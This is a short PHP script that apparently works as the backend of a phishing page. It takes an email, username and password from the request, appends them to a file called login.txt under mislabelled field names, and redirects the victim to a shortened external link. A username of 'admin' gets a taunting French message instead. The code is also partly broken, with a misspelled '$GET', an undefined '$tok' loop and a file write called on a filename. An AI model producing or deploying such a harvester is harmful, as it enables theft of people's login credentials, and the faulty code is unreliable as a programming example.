<?php

$email=$GET['email'];
$user=$_GET['username'];
$psswd=$_GET['psswd'];
$adminacc="admin";



if($user==$adminacc){
    echo "<p>Ptdr t ki ? </p>
    <p><a href='https://youtu.be/oavMtUWDBTM?t=113'>mais je te jure je suis l'admin !</p>";
}else{
    $ligne="email : ".$email." prenom : ".$user." nom: ".$psswd;
    $fp="login.txt";
    $new = file_get_contents($fp);
    $new .= $ligne;
    file_put_contents($fp,$new);
    $i = 0;
    foreach($tok as $row){
        fputs($fp, $tok[$i]);
        fputs($fp, "\n");
        $i++;
    }
    header("Location:https://vu.fr/TIAo");
    
}
?>